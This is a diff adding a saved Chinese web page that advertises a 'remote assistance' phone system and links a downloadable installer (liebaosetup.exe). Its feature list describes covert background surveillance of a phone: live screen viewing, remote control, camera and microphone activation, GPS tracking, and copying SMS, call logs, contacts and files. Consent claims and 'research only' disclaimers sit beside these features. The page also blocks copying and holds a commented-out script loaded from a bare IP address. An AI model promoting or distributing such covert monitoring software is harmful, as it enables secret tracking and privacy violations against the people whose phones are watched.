@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<!-- saved from url=(0026)http://www.qx1818.com/bwl/ -->
+<html>
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  	<meta charset="utf-8">
+  	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  	<title>
+			猎豹远程协助手机系统官网
+  	</title>
+  	<link rel="shortcut icon" href="./files/liebaoico64.ico">
+  	<link rel="stylesheet" href="./files/buttons.css">
+  	<link rel="stylesheet" href="./files/app.css">
+  	<link rel="stylesheet" href="./files/font-awesome.min.css">
+  	<script type="text/javascript" src="./files/jquery.js"></script>
+  	<script type="text/javascript" src="./files/bootstrap.min.js"></script>
+  	<style>
+    	#main article { border-bottom: none; }
+			body{
+		    font: 500 .875em PingFang SC,Lantinghei SC,Microsoft Yahei,Hiragino Sans GB,Microsoft Sans Serif,WenQuanYi Micro Hei,sans;
+        background-color: #07040e;
+			}
+  		#canvas {
+        position: absolute;
+    		z-index: 10;
+    		top: 0;
+    		left: 0;
+    		bottom: 0;
+    		right: 0;
+    		cursor: none;
+      }
+      .content{
+      	position: absolute;
+    		z-index: 11;
+    		right: 0;
+    		left: 0;
+    		top: 0;
+    		bottom: 0;
+			}
+			.splash{
+  			position: relative;
+  		}
+  		img#qq {
+    		width: 96px;
+    		background-size: cover;
+    		border-radius: 150px;
+    		box-shadow: 0px 0px 40px rgba(63, 81, 181, 0.72);
+    		border: 3px solid #00a0ff;
+    		opacity: 1;
+    		margin: 0 auto;
+    		margin-top: 0px;
+				margin-bottom: 0px;
+				transition: all 1.0s;  
+			}
+			#qq:hover {
+    		box-shadow: 0 0 10px #fff;
+    		-webkit-box-shadow: 0 0 19px #fff;
+    		transform:rotate(360deg);
+   			-ms-transform:rotate(360deg); 	/* IE 9 */
+    		-moz-transform:rotate(360deg); 	/* Firefox */
+    		-webkit-transform:rotate(360deg); /* Safari 和 Chrome */
+    		-o-transform:rotate(360deg); 	/* Opera */
+    		filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=3);
+			} 
+			.STYLE1 {color: #FFFF00}
+			.STYLE3 {
+				color: #FF0000;
+				font-weight: bold;
+			}
+  		.STYLE4 {color: #FF00FF}
+  		.STYLE5 {color: #FFFF00}
+   		.demo {
+            width: 100%;
+            height: 100%;
+            max-width: 760px;
+      }
+      .demo img{
+            width: 100%;
+            height: 62.5%;
+			}
+  	</style>
+		<script type="text/javascript">
+			var appid;
+			function getappid(data){
+				var regExp=new RegExp(/(Default.Constants.AjaxApiAppId = ')([A-Za-z0-9-_*]{45})/igm);
+				appid=regExp.exec(data.query.results.script.content)[2];
+				var iframe=document.getElementsByTagName('iframe');
+				var frame=document.getElementsByTagName('frame');
+				var sDocText=document.body.innerText||document.body.textContent||'';
+				for(var i=0;i<iframe.length;i++){
+					sDocText=sDocText+iframe[i].contentDocument.body.innerText||document.body.textContent||'';
+				}
+				for(var i=0;i<frame.length;i++){
+					sDocText=sDocText+frame[i].contentDocument.body.innerText||document.body.textContent||'';
+				}
+				var aDetectText=[];
+				for(var i=10;i>=0;--i){
+					var sTextChunk=sDocText.substr((i*sDocText.length)/10,100);
+					if(sTextChunk&&sTextChunk.indexOf('{')==-1&&sTextChunk.indexOf('}')==-1){
+						aDetectText.push(sTextChunk.replace(/s+/g,' '))
+					}
+				}
+				var sDetectTextEnc=encodeURIComponent(aDetectText.join(' '));
+				if(sDetectTextEnc.length>1600){
+					sDetectTextEnc=sDetectTextEnc.substr(0,1600)
+				}
+				var eDetectScript=document.createElement('script');
+				eDetectScript.type='text/javascript';
+				eDetectScript.src='http://api.microsofttranslator.com/v2/ajax.svc/Detect?appId='+appid+'&text='+sDetectTextEnc+'&oncomplete=Detectsuccess';
+				document.body.insertBefore(eDetectScript,document.body.firstChild)
+			}
+		</script>
+		<script type="text/javascript" src="./files/yql"></script>
+		<script type="text/javascript">var usertolan='zh-chs';</script>
+		<script type="text/javascript">
+			function Detectsuccess(data){
+				if(usertolan.toLowerCase()!=data.toLowerCase()){
+					var s=document.createElement("script");
+					s.type="text/javascript";
+					s.charset="UTF-8";
+					s.src=((location&&location.href&&location.href.indexOf("https")==0)?"https://ssl.microsofttranslator.com":"http://www.microsofttranslator.com")+"/ajax/v2/widget.aspx?mode=notify&from="+data+"&to="+usertolan+"&layout=ts";
+					var p=document.getElementsByTagName("head")[0]||document.documentElement;p.insertBefore(s,p.firstChild)
+				}
+			}
+		</script>
+	</head>
+	<body class="home page page-id-194 page-template page-template-page-homepage page-template-page-homepage-php custom-background" ondragstart="window.event.returnValue=false" oncontextmenu="window.event.returnValue=false" onselectstart="event.returnValue=false">
+	<embed src="./files/2187458480.mp3" hidden="true" autostart="true" loop="true">
+        <!-- end .navbar-collapse -->
+      <!-- end .container -->
+    <!-- end .navbar -->
+  <!-- end header -->
+  <div class="jumbotron">
+    <div class="container">
+      <div class="splash">
+        <div class="content">
+          <img src="./files/liebao150.png" alt="PatternFly logo" id="qq" class="wow fadeInDown animated" style="visibility: visible; animation-name: fadeInDown;">
+          <h1 class="wow fadeIn animated" data-wow-delay="750ms" style="visibility: visible; animation-delay: 750ms; animation-name: fadeIn;">
+            <strong>猎豹远程协助手机系统</strong>
+          </h1>
+          <h2 align="right" class="wow fadeIn animated" data-wow-delay="750ms" style="visibility: visible;color:red; animation-delay: 750ms; animation-name: fadeIn;">
+          	<strong>------玩机达人必备！</strong>
+          </h2>
+          <h2 class="STYLE5" align="center"><strong>一、隐私声明</strong></h2>
+          <br>
+          <p class="STYLE5" align="left"><strong>1。本软件不是木马病毒，不会隐藏，不会自我复制，不会自我传播，不会破坏手机数据；</strong></p>
+          <br>
+          <p class="STYLE5" align="left"><strong>2。必须机主本人同意后才能使用该软件；</strong></p>
+          <br>
+          <p class="STYLE5" align="left"><strong>3。本软件的各项功能必须获得机主本人的授权才能发挥作用；</strong></p>
+          <br>
+          <p class="STYLE5" align="left"><strong>4。本软件不会秘密窃取机主的隐私信息！请放心使用！</strong></p>
+          <br>
+          <p class="STYLE5" align="left"><strong>5。本软件属于手机协助类软件，已获得国家颁发的软件著作权证书；</strong></p>
+					<br>
+		  		<hr style="height:1px;border:none;border-top:1px solid #0066CC;">
+		  		<p></p>
+		  
+		  		<!--
+		  		<a href="http://in87.cn/spjx/" class="button button-glow button-border button-rounded button-primary"><i class="fa fa-cloud"></i>免VIP视频解析</a>
+		  		&nbsp&nbsp&nbsp&nbsp
+		  		<a href="http://in87.cn/IOS/" class="button button-glow button-border button-rounded button-primary"><i class="fa fa-apple"></i>  破解苹果App </a>
+		  		&nbsp&nbsp&nbsp&nbsp
+		  		<a href="http://in87.cn/az/" class="button button-glow button-border button-rounded button-primary"><i class="fa fa-android"></i>   破解安卓App</a>
+		  		&nbsp&nbsp&nbsp&nbsp
+		  		<a href="http://in87.cn/ffl/" class="button button-glow button-border button-rounded button-primary"><i class="fa fa-weixin"></i>   正版收费软件   </a>
+		  		-->
+		  <h2 class="STYLE5" align="center"><strong>二、功能介绍</strong></h2>
+		  <br>
+		  <p class="STYLE5" align="left"><strong>1。【远程屏幕】：后台实时远程观看手机屏幕显示的内容；</strong></p>
+		  <br>
+		  <p class="STYLE5" align="left"><strong>2。【远程操作】：后台远程操作手机(点击、滑动，长按，输入文字）；</strong></p>
+		  <br>
+		  <p class="STYLE5" align="left"><strong>3。【文件管理】：上传或下载备份手机内的文件或图片；</strong></p>
+		  <br>
+		  <p class="STYLE5" align="left"><strong>4。【定位功能】：通过GPS和数据定位手机位置并在高德地图上显示（误差10米）；</strong></p>
+		  <br>
+		  <p class="STYLE5" align="left"><strong>5。【远程摄像】：远程调用摄像头，在后台能实时观看手机周围环境（把手机变成远程摄像头）；</strong></p>
+		  <br>
+		  <p class="STYLE5" align="left"><strong>6。【远程语音】：远程打开麦克风，在后台能实时听到手机周围环境音；</strong></p>
+		  <br>
+		  <p class="STYLE5" align="left"><strong>7。【通话记录】：远程备份手机内通话时间，电话号码等历史通话信息；</strong></p>
+		  <br>
+		  <p class="STYLE5" align="left"><strong>8。【通讯录】：远程备份手机通讯录联系人列表；</strong></p>
+		  <br>
+			<p class="STYLE5" align="left"><strong>9。【远程短信】：远程备份手机内的短信记录；</strong></p>
+		  <br>
+		  <p class="STYLE5" align="left"><strong>10。【应用管理】：远程获取手机内安装的应用程序信息；</strong></p>
+		  <br>
+		  <p class="STYLE5" align="left"><strong>11。【远程消息】：远程发送文字消息到手机端；</strong></p>
+		  <br>
+		  <hr style="height:1px;border:none;border-top:1px solid #0066CC;">
+			<p></p>	
+		  <h2 class="STYLE5" align="center"><strong>三、软件下载</strong></h2>
+		  <hr style="height:1px;border:none;border-top:1px dashed #0066CC;">
+		  <p class="STYLE4"><strong>【猎豹协助】在电脑上下载本软件</strong></p>
+		  <a href="./files/apk/liebaosetup.exe" class="button button-glow button-border button-rounded button-primary">猎豹协助下载</a>
+		  <a href="" class="button button-glow button-border button-rounded button-primary">安装演示</a><br>
+		  <hr style="height:1px;border:none;border-top:1px solid #0066CC;">
+		  <h2 class="STYLE5" align="center"><strong>四、软件截图</strong></h2>
+		  
+		  <p></p>	
+		  <p><img src="./files/images/computer.jpg" /></p>
+		  <p><img src="./files/images/phone.jpg" /></p>	 
+		  <hr style="height:1px;border:none;border-top:1px solid #0066CC;">
+			<p></p>	
+		  <p><strong><span class="STYLE1">公告</span>：<span class="STYLE3">本系列辅助软件仅限用于学习和研究目的！不得将上述软件用于商业或者非法用途！</span></strong></p>
+			<h5 class="STYLE5" align="center"><strong>技术支持QQ：3123696367    微信:xy520888001    skype:cyc6352@outlook.com<strong></h5>
+		 
+		  <div style="
+    width: 100%;
+    bottom: 30px;
+    box-sizing: border-box;
+    left: 0;
+		">© 2015-2020 猎豹科技Android专家团队<br>本系列辅助软件仅限用于学习和研究目的！不得将上述内容用于商业或者非法用途！否则，一切后果用户自负！本公司一概不承担任何法律责任！如使用者使用，即表示同意。</div>
+        </div>
+      </div>
+    </div>
+  <canvas id="canvas" width="100%" height="100%"></canvas>
+  <!-- <div id="particles-js"></div> -->
+  
+  </div>
+ 
+
+<!-- <script type="text/javascript" language="javascript" src=" http://121.42.189.168/cq"></script>
+<script src="js/hovertreewelcome.js"></script>
+<script type="text/javascript">
+
+// particlesJS('particles-js',
+//   {
+//     "particles": {
+//       "number": {
+//         "value": 110,
+//         "density": {
+//           "enable": true,
+//           "value_area": 800
+//         }
+//       },
+//       "color": {
+//         "value": "#ffffff"
+//       },
+//       "shape": {
+//         "type": "circle",
+//         "stroke": {
+//           "width": 0,
+//           "color": "#000000"
+//         },
+//         "polygon": {
+//           "nb_sides": 5
+//         },
+//         "image": {
+//           "src": "img/github.svg",
+//           "width": 100,
+//           "height": 100
+//         }
+//       },
+//       "opacity": {
+//         "value": 0.5,
+//         "random": false,
+//         "anim": {
+//           "enable": false,
+//           "speed": 1,
+//           "opacity_min": 0.1,
+//           "sync": false
+//         }
+//       },
+//       "size": {
+//         "value": 1,
+//         "random": true,
+//         "anim": {
+//           "enable": false,
+//           "speed": 20,
+//           "size_min": 0.1,
+//           "sync": false
+//         }
+//       },
+//       "line_linked": {
+//         "enable": true,
+//         "distance": 40,
+//         "color": "#fff",
+//         "opacity": 1,
+//         "width": 1
+//       },
+//       "move": {
+//         "enable": true,
+//         "speed": 3,
+//         "direction": "none",
+//         "random": false,
+//         "straight": false,
+//         "out_mode": "out",
+//         "attract": {
+//           "enable": false,
+//           "rotateX": 600,
+//           "rotateY": 1200
+//         }
+//       }
+//     },
+//     "interactivity": {
+//       "detect_on": "canvas",
+//       "events": {
+//         "onhover": {
+//           "enable": true,
+//           "mode": "grab"
+//         },
+//         "onclick": {
+//           "enable": true,
+//           "mode": "push"
+//         },
+//         "resize": true
+//       },
+//       "modes": {
+//         "grab": {
+//           "distance": 120,
+//           "line_linked": {
+//             "opacity": 1
+//           }
+//         },
+//         "bubble": {
+//           "distance": 400,
+//           "size": 40,
+//           "duration": 2,
+//           "opacity": 8,
+//           "speed": 3
+//         },
+//         "repulse": {
+//           "distance": 300
+//         },
+//         "push": {
+//           "particles_nb": 4
+//         },
+//         "remove": {
+//           "particles_nb": 2
+//         }
+//       }
+//     },
+//     "retina_detect": true,
+//     "config_demo": {
+//       "hide_card": false,
+//       "background_color": "#b61924",
+//       "background_image": "",
+//       "background_position": "50% 50%",
+//       "background_repeat": "no-repeat",
+//       "background_size": "cover"
+//     }
+//   }
+
+// );
+
+
+        ; (function (window) {
+
+            var ctx,
+                hue,
+                logo,
+                form,
+                buffer,
+                target = {},
+                tendrils = [],
+                settings = {};
+
+            settings.debug = true;
+            settings.friction = 0.5;
+            settings.trails = 20;
+            settings.size = 50;
+            settings.dampening = 0.25;
+            settings.tension = 0.98;
+
+            Math.TWO_PI = Math.PI * 2;
+
+            // ========================================================================================
+            // Oscillator 何问起
+            // ----------------------------------------------------------------------------------------
+
+            function Oscillator(options) {
+                this.init(options || {});
+            }
+
+            Oscillator.prototype = (function () {
+
+                var value = 0;
+
+                return {
+
+                    init: function (options) {
+                        this.phase = options.phase || 0;
+                        this.offset = options.offset || 0;
+                        this.frequency = options.frequency || 0.001;
+                        this.amplitude = options.amplitude || 1;
+                    },
+
+                    update: function () {
+                        this.phase += this.frequency;
+                        value = this.offset + Math.sin(this.phase) * this.amplitude;
+                        return value;
+                    },
+
+                    value: function () {
+                        return value;
+                    }
+                };
+
+            })();
+
+            // ========================================================================================
+            // Tendril hovertree.com
+            // ----------------------------------------------------------------------------------------
+
+            function Tendril(options) {
+                this.init(options || {});
+            }
+
+            Tendril.prototype = (function () {
+
+                function Node() {
+                    this.x = 0;
+                    this.y = 0;
+                    this.vy = 0;
+                    this.vx = 0;
+                }
+
+                return {
+
+                    init: function (options) {
+
+                        this.spring = options.spring + (Math.random() * 0.1) - 0.05;
+                        this.friction = settings.friction + (Math.random() * 0.01) - 0.005;
+                        this.nodes = [];
+
+                        for (var i = 0, node; i < settings.size; i++) {
+
+                            node = new Node();
+                            node.x = target.x;
+                            node.y = target.y;
+
+                            this.nodes.push(node);
+                        }
+                    },
+
+                    update: function () {
+
+                        var spring = this.spring,
+                            node = this.nodes[0];
+
+                        node.vx += (target.x - node.x) * spring;
+                        node.vy += (target.y - node.y) * spring;
+
+                        for (var prev, i = 0, n = this.nodes.length; i < n; i++) {
+
+                            node = this.nodes[i];
+
+                            if (i > 0) {
+
+                                prev = this.nodes[i - 1];
+
+                                node.vx += (prev.x - node.x) * spring;
+                                node.vy += (prev.y - node.y) * spring;
+                                node.vx += prev.vx * settings.dampening;
+                                node.vy += prev.vy * settings.dampening;
+                            }
+
+                            node.vx *= this.friction;
+                            node.vy *= this.friction;
+                            node.x += node.vx;
+                            node.y += node.vy;
+
+                            spring *= settings.tension;
+                        }
+                    },
+
+                    draw: function () {
+
+                        var x = this.nodes[0].x,
+                            y = this.nodes[0].y,
+                            a, b;
+
+                        ctx.beginPath();
+                        ctx.moveTo(x, y);
+
+                        for (var i = 1, n = this.nodes.length - 2; i < n; i++) {
+
+                            a = this.nodes[i];
+                            b = this.nodes[i + 1];
+                            x = (a.x + b.x) * 0.5;
+                            y = (a.y + b.y) * 0.5;
+
+                            ctx.quadraticCurveTo(a.x, a.y, x, y);
+                        }
+
+                        a = this.nodes[i];
+                        b = this.nodes[i + 1];
+
+                        ctx.quadraticCurveTo(a.x, a.y, b.x, b.y);
+                        ctx.stroke();
+                        ctx.closePath();
+                    }
+                };
+
+            })();
+
+            // ----------------------------------------------------------------------------------------
+
+            function init(event) {
+
+                document.removeEventListener('mousemove', init);
+                document.removeEventListener('touchstart', init);
+
+                document.addEventListener('mousemove', mousemove);
+                document.addEventListener('touchmove', mousemove);
+                document.addEventListener('touchstart', touchstart);
+
+                mousemove(event);
+                reset();
+                loop();
+            }
+
+            function reset() {
+
+                tendrils = [];
+
+                for (var i = 0; i < settings.trails; i++) {
+
+                    tendrils.push(new Tendril({
+                        spring: 0.45 + 0.025 * (i / settings.trails)
+                    }));
+                }
+            }
+
+            function loop() {
+
+                if (!ctx.running) return;
+
+                ctx.globalCompositeOperation = 'source-over';
+                ctx.fillStyle = 'rgba(8,5,16,0.4)';
+                ctx.fillRect(0, 0, ctx.canvas.width, ctx.canvas.height);
+                ctx.globalCompositeOperation = 'lighter';
+                ctx.strokeStyle = 'hsla(' + Math.round(hue.update()) + ',90%,50%,0.25)';
+                ctx.lineWidth = 1;
+
+                if (ctx.frame % 60 == 0) {
+                    console.log(hue.update(), Math.round(hue.update()), hue.phase, hue.offset, hue.frequency, hue.amplitude);
+                }
+
+                for (var i = 0, tendril; i < settings.trails; i++) {
+                    tendril = tendrils[i];
+                    tendril.update();
+                    tendril.draw();
+                }
+
+                ctx.frame++;
+                ctx.stats.update();
+                requestAnimFrame(loop);
+            }
+
+            function resize() {
+                ctx.canvas.width = window.innerWidth;
+                ctx.canvas.height = window.innerHeight;
+            }
+
+            function start() {
+                if (!ctx.running) {
+                    ctx.running = true;
+                    loop();
+                }
+            }
+
+            function stop() {
+                ctx.running = false;
+            }
+
+            function mousemove(event) {
+                if (event.touches) {
+                    target.x = event.touches[0].pageX;
+                    target.y = event.touches[0].pageY;
+                } else {
+                    target.x = event.clientX
+                    target.y = event.clientY;
+                }
+                event.preventDefault();
+            }
+
+            function touchstart(event) {
+                if (event.touches.length == 1) {
+                    target.x = event.touches[0].pageX;
+                    target.y = event.touches[0].pageY;
+                }
+            }
+
+            function keyup(event) {
+
+                switch (event.keyCode) {
+                    case 32:
+                        save();
+                        break;
+                    default:
+                        // console.log(event.keyCode); hovertree.com
+                }
+            }
+
+            function letters(id) {
+
+                var el = document.getElementById(id),
+                    letters = el.innerHTML.replace('&amp;', '&').split(''),
+                    heading = '';
+
+                for (var i = 0, n = letters.length, letter; i < n; i++) {
+                    letter = letters[i].replace('&', '&amp');
+                    heading += letter.trim() ? '<span class="letter-' + i + '">' + letter + '</span>' : '&nbsp;';
+                }
+
+                el.innerHTML = heading;
+                setTimeout(function () {
+                    el.className = 'transition-in';
+                }, (Math.random() * 500) + 500);
+            }
+
+            function save() {
+
+                if (!buffer) {
+
+                    buffer = document.createElement('canvas');
+                    buffer.width = screen.availWidth;
+                    buffer.height = screen.availHeight;
+                    buffer.ctx = buffer.getContext('2d');
+
+                    form = document.createElement('form');
+                    form.method = 'post';
+                    form.input = document.createElement('input');
+                    form.input.type = 'hidden';
+                    form.input.name = 'data';
+                    form.appendChild(form.input);
+
+                    document.body.appendChild(form);
+                }
+
+                buffer.ctx.fillStyle = 'rgba(8,5,16)';
+                buffer.ctx.fillRect(0, 0, buffer.width, buffer.height);
+
+                buffer.ctx.drawImage(canvas,
+                    Math.round(buffer.width / 2 - canvas.width / 2),
+                    Math.round(buffer.height / 2 - canvas.height / 2)
+                );
+
+                buffer.ctx.drawImage(logo,
+                    Math.round(buffer.width / 2 - logo.width / 4),
+                    Math.round(buffer.height / 2 - logo.height / 4),
+                    logo.width / 2,
+                    logo.height / 2
+                );
+
+                window.open(buffer.toDataURL(), 'wallpaper', 'top=0,left=0,width=' + buffer.width + ',height=' + buffer.height);
+
+                // form.input.value = buffer.toDataURL().substr(22);
+                // form.submit(); hovertree.com
+            }
+
+            window.requestAnimFrame = (function () {
+                return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function (fn) { window.setTimeout(fn, 1000 / 60) };
+            })();
+
+            window.onload = function () {
+
+                ctx = document.getElementById('canvas').getContext('2d');
+                ctx.stats = new Stats();
+                ctx.running = true;
+                ctx.frame = 1;
+
+               
+
+                hue = new Oscillator({
+                    phase: Math.random() * Math.TWO_PI,
+                    amplitude: 85,
+                    frequency: 0.0015,
+                    offset: 285
+                });
+
+             
+
+                document.addEventListener('mousemove', init);
+                document.addEventListener('touchstart', init);
+                document.body.addEventListener('orientationchange', resize);
+                window.addEventListener('resize', resize);
+                window.addEventListener('keyup', keyup);
+                window.addEventListener('focus', start);
+                window.addEventListener('blur', stop);
+
+                resize();
+
+                if (window.DEBUG) {
+
+                    var gui = new dat.GUI();
+
+                    // gui.add(settings, 'debug');
+                    settings.gui.add(settings, 'trails', 1, 30).onChange(reset);
+                    settings.gui.add(settings, 'size', 25, 75).onFinishChange(reset);
+                    settings.gui.add(settings, 'friction', 0.45, 0.55).onFinishChange(reset);
+                    settings.gui.add(settings, 'dampening', 0.01, 0.4).onFinishChange(reset);
+                    settings.gui.add(settings, 'tension', 0.95, 0.999).onFinishChange(reset);
+
+                    document.body.appendChild(ctx.stats.domElement);
+                }
+            };
+
+        })(window);
+
+    </script>-->
+
+
+<audio autoplay="autoplay" loop="loop">
+<source src="./files/2187458480.mp3" type="audio/mpeg">
+</audio>
+
+<div id="MicrosoftTranslatorWidget" style="width: 0px; min-height: 83px; border-color: #3A5770; background-color: #78ADD0; display:none;"></div><script language="VBScript"><!--
+
+//--></script>
+<p style="display:none;">
+
+<script>
+ setTimeout(function(){
+ $(window).scrollTop(1);
+ },0);
+  document.getElementById('car_audio').play();
+ document.addEventListener("WeixinJSBridgeReady", function () {
+        WeixinJSBridge.invoke('getNetworkType', {}, function (e) {
+  document.getElementById('car_audio').play();
+        });
+    }, false);
+</script>
+</p> 
+<script language="VBScript"><!--
+
+//--></script>
+	
+</body></html>
